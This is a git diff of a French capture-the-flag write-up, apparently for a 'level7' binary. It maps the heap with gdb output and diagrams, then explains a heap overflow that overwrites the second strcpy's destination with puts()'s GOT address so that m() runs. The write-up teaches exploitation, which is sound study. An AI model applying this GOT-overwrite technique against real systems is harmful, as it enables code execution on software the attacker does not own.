@@ -226,21 +226,88 @@ Il va falloir trouver un moyen de remplacer l'adresse de puts() dans la GOT (cf.
 
 Pour cela, nous allons exploiter le fait que les strcpy() ne soient pas protégés: en cas de buffer overflow du premier, on peut venir écrire sur le premier argument du second strcpy(): l'adresse ou il va écrire la valeur qu'on lui donne en argv[2].
 
-Pour trouver l'offset on va se servir de [ltrace](https://www.tutorialspoint.com/unix_commands/ltrace.htm) et du générateur de pattern:
-- `ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`
-  ```
-  __libc_start_main(0x8048521, 2, 0xbffff6f4, 0x8048610, 0x8048680 <unfinished ...>
-  malloc(8)                                                                                              = 0x0804a008
-  malloc(8)                                                                                              = 0x0804a018
-  malloc(8)                                                                                              = 0x0804a028
-  malloc(8)                                                                                              = 0x0804a038
-  strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)                                              = 0x0804a018
-  strcpy(0x37614136, NULL <unfinished ...>
-  --- SIGSEGV (Segmentation fault) ---
-  +++ killed by SIGSEGV +++
-  ```
-  - Le générateur de pattern nous indique un offset de 20 pour la valeur 0x37614136
+### Explications
 
+On va dessiner la heap en se servant du debugging dans le fichier source:
+- On copie le source.c dans tmp, on le gdb et on lance `./a.out aaaa bbbb`:
+  ```
+  
+  a	(0xbffff718)	=	0x804b008
+  a[0]	(0x804b008)	=	1
+  a[1]	(0x804b00c)	=	0x804b018
+
+
+  b	(0xbffff71c)	=	0x804b028
+  b[0]	(0x804b028)	=	2
+  b[1]	(0x804b02c)	=	0x804b038
+
+  strcpy(0x804b018, aaaa)
+
+  a	(0xbffff718)	=	0x804b008
+  a[0]	(0x804b008)	=	1
+  a[1]	(0x804b00c)	=	0x804b018
+
+
+  b	(0xbffff71c)	=	0x804b028
+  b[0]	(0x804b028)	=	2
+  b[1]	(0x804b02c)	=	0x804b038
+
+  strcpy(0x804b038, bbbb)
+  ```
+- En dessinant la heap:
+  ```
+  ------------------------ 0x804b040 -------------------------------------
+    malloc de b[1]
+  ------------------------ 0x804b03c -------------------------------------
+    malloc de b[1]
+  ------------------------ 0x804b038 (&b[1], b[1][0]) --------------------
+  ------------------------ 0x804b034 -------------------------------------
+  ------------------------ 0x804b030 -------------------------------------
+    0x804b038 (adresse du malloc de b[1]) <= c'est lui qu'on veut override
+  ------------------------ 0x804b02c (b[1]) ------------------------------
+    2
+  ------------------------ 0x804b028 (&b, b[0]) ---------------------------
+  ------------------------ 0x804b024 --------------------------------------
+  ------------------------ 0x804b020 --------------------------------------
+   malloc de a[1]
+  ------------------------ 0x804b01c --------------------------------------
+   malloc de a[1] <= C'est lui qu'on fait overflow
+  ------------------------ 0x804b018 (&a[1], a[1][0]) ---------------------
+  ------------------------ 0x804b014 --------------------------------------
+  ------------------------ 0x804b010 --------------------------------------
+    0x804b018 (adresse du malloc de a[1])
+  ------------------------ 0x804b00c (a[1]) -------------------------------
+    1
+  ------------------------ 0x804b008 (&a, a[0]) ---------------------------
+  ```
+- On veut overflow depuis 0x804b018 jusqu'à écrire dans 0x804b02c, donc avec 20 * "A" + "BBBB" en argv[1], on obtient cette heap:
+  ```
+  ------------------------ 0x804b040 -------------------------------------
+    malloc de b[1]
+  ------------------------ 0x804b03c -------------------------------------
+    malloc de b[1]
+  ------------------------ 0x804b038 (&b[1], b[1][0]) --------------------
+  ------------------------ 0x804b034 -------------------------------------
+  ------------------------ 0x804b030 -------------------------------------
+   BBBB
+  ------------------------ 0x804b02c (b[1]) ------------------------------
+   AAAA
+  ------------------------ 0x804b028 (&b, b[0]) ---------------------------
+   AAAA
+  ------------------------ 0x804b024 --------------------------------------
+   AAAA
+  ------------------------ 0x804b020 --------------------------------------
+   AAAA
+  ------------------------ 0x804b01c --------------------------------------
+   AAAA
+  ------------------------ 0x804b018 (&a[1], a[1][0]) ---------------------
+  ------------------------ 0x804b014 --------------------------------------
+  ------------------------ 0x804b010 --------------------------------------
+    0x804b018 (adresse du malloc de a[1])
+  ------------------------ 0x804b00c (a[1]) -------------------------------
+    1
+  ------------------------ 0x804b008 (&a, a[0]) ---------------------------
+  ```
 Il va donc valloir construire un payload avec 20 random chars + l'adresse de puts() dans la GOT comme premier argument, et l'adresse de m() en second argument.
 
 - `objdump -R level5`
